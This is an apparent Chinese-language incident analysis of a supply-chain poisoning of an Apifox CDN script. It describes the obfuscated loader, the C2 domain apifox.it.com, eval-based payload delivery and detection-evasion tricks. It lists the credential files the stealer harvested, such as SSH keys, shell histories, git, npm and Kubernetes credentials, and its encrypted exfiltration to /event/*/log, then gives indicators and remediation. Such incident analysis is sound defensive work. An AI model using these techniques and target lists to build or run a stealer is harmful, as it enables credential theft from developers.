事件引言：


3月apifox的供应链投毒事件影响广泛，公司内安全运营也给了情报

这里尽量做一下分析和学习。

Apifox用于 API 开发、测试、联调的一体化协作平台；基于Electron 框架开发
而本次被投毒的文件 https://cdn.apifox.com/www/assets/js/apifox-app-event-tracking.min.js
Apifox 桌面客户端在启动时会加载这个用于事件追踪的 SDK 文件

简单说下来，就是投毒一个放在CDN的js文件，写入混淆的恶意代码，代码指向C2域名apifox.it.com，c2域名又指向
下面分析一下攻击链细节👇

代码分析

从Wayback获取中毒阶段代码：
投毒源码，快照时间：2026-03-05 05:14:18
文件结构为：前段为 Apifox 原有事件追踪代码，后段自 _0x10e4() 等符号起增加约 40KB，即合法埋点之后追加恶意载荷。

可以看到后面的代码分格和前面不一样，表面就是用了16进制混淆

用ai做一下反混淆，还原后的逻辑就是
「凑齐身份 → 带自定义头请求 C2 → 解密并 eval」

身份打点

  1. 构造机器指纹
    用 Electron 的 require('os') 和 require('crypto') 权限，提取硬件特征（MAC+CPU+主机+用户名）
    拼接并SHA-256哈希，作为唯一机器ID，写入 localStorage 的 _rl_mc（写入缓存，防止重采）
    目的：确认肉鸡身份
  2. 双重身份绑定
    同上，不止识别机器，还识别用户
    检查 localStorage 中是否存在 Apifox.common.accessToken。
    这个token可调用 api/v1/user接口，获取用户 邮箱和用户名

以上两条 各种信息，分别加密或打包或明文， 放在请求头里（af_uuid/os/user/name等）

  1. 向C2发送请求
    在上述加密代码中也内嵌了RSA私钥，这也用于处理C2回包
    向https://apifox.it.com/public/apifox-event.js发送带header的请求（fetch/XMLHttpRequest）

    随后服务器就返回加密的恶意JS，解密后直接eval()执行
    做了分块，非对称加密，填充

上述代码是在污染的cdn中的，eval() 的作用是把apifox-event.js回显的加密的字符串，当场当作程序运行。最后加载一个随机路径脚本
持久化处理：try/catch 中出错会静默忽略；finally 里固定调用 scheduleNext()随机延迟绕过流量检测

C2渗透分析

下图所示为恶意域名的IP，且无法直接访问，说明做了Host或路径的限定

所以按照代码要求加上路径apifox-event.js和特定的请求头

响应确实像是RSA密文，344字节的js；用前面代码中内嵌的私钥解密
得到加载器，这段js会因为cdnjs中的eval函数而执行，去加载一个随机路径js（最终攻击）

  • 路径随机化，每次生成不同的文件名，绕过url检测
  • 脚本加载完毕自动删除dom标签和历史文件路径（防止取证）
  • 同时请求头还是带上肉鸡指纹
    这一套教科书的做法：加密防止waf/IPS拦截，随机跳转防止攻击被取证并拦截， 随机延时防止沙箱检测

窃取信息(两轮)

最后再跟着路径带上header发请求（模拟实际中毒中的onload）


最后就是明文（3400字节Node.js）了，可以看到这里还有中文注释，且有很重的AI味
其中加密的密码，盐值等加密相关信息图中就比较明显了

窃取目标：
全平台通用：

  • ~/.ssh/ — 递归读取整个目录（私钥、公钥、config、known_hosts、authorized_keys）
    macOS / Linux 窃取：
  • ~/.zsh_history — Zsh 命令行历史（含密码、Token、内部 URL）
  • ~/.bash_history — Bash 命令行历史
  • ~/.git-credentials — Git 明文凭证（GitHub PAT、GitLab Token）
  • ps aux — 完整进程列表
    Windows 额外窃取：
  • tasklist — 进程列表

这些数据通过数据外泄协议进行：
原始 JSON → Gzip 压缩 → AES-256-GCM 加密 → Base64 编码 → POST 上传

最后POST到 apifox.it.com/event/0/log

再次升级
随后事态升级
攻击者根据一轮信息做了二轮纵深升级
增加到4400字节，上报到新路径/event/2/log

新增窃取目标 说明
~/.zshrc Shell 环境变量（可能含 API Key、Vault 地址、数据库连接串）
~/.npmrc npm registry 认证 token
~/.kube/* Kubernetes 集群配置（含 OIDC refresh token、集群 API 地址）
~/.subversion/* SVN 凭证
目录树遍历 主目录、桌面、文档目录结构（深度 1-2 层），Windows 额外扫描 D:\、E:\、F:\

思考

首先，如何做到覆盖cdn，目前交无权威的说法，这也是攻击点，难以披露；个人认为要么是内部cdn的key或token泄露，要么是类似于依赖混淆，npm包被混淆，打包被污染最后导致产物污染

其次，攻击者在入口js做了7层混淆，惊为天人，但也在混淆中加了硬编码和初级的aicoding后渗透信息加密传输，这种现象耐人寻味

最后，我们留意到cdn的js文件中有用到eval()命令执行，结合 scheduleNext() 函数的轮询机制，就可以通过这个后面上线CS，实现更多控制（RCE）
这都源自于Electron 赋予了 JS 调用 child_process（执行系统命令）和 fs（读写文件）的权限，攻击者通过 eval() 下发的代码几乎可以执行任何系统操作。

检测修复

检测

先看看我们是这么做到受害检测的
网络测：
防火墙，代理，DNS日志中多次出现api.it.com，以及对POST /event/0/log的多次外送
header中多次包含af_*格式
Electron localStorage 中是否存在 _rl_headers、_rl_mc 键
恶意文件是很难被补货到的，因为随机生成且用完即删除，所以唯一可能检测到的就是 EDR的行为检测

修复

修复方案就是更新（禁用）apifox/启用sandbox沙盒模式
删除所有密钥，key，token
检查其他登录日志，看看有没有被登录，有没有操作历史
